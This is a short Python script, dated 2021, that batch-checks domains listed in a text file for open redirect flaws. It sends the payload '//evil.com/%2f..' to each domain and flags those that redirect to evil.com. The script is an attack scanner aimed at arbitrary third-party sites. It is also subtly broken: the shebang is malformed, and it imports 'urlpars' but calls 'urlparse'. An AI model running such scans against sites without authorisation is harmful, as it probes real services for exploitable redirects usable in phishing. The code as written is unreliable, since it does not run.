#!/usr/bin env python3
"""
    批量检测Open Redirect漏洞 

    author: G.S.D
    date: 06/2021
"""

import requests
from urllib.parse import urlpars


def exploit(domain:str):
    try:
        payload = '//evil.com/%2f..'
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'}
        # allow_redirects = False,  close automatic redirection
        r = requests.get('https://' + domain + payload, headers = headers, timeout = 30, allow_redirects = False)
        parsed_result = urlparse(r.headers["location"])
        if parsed_result.netloc == "evil.com":
            print("\033[1;32;40m[+] Domain: " + domain, "Status code: " + str(r.status_code), "Redirecting to: " + r.headers["location"] + "\033[0m")
        else:
            print("\033[1;31;40m[-] Domain: ", domain + "\033[0m")
    except Exception as e:
        # print("Error:", e)
        print("\033[1;31;40m[-] Domain: ", domain + "\033[0m")

def main():
    f = open('domain.txt', 'r+')
    lines = f.readlines()
    for i in lines:
        exploit(i.strip())
    f.close()

if __name__ == '__main__':
    main()
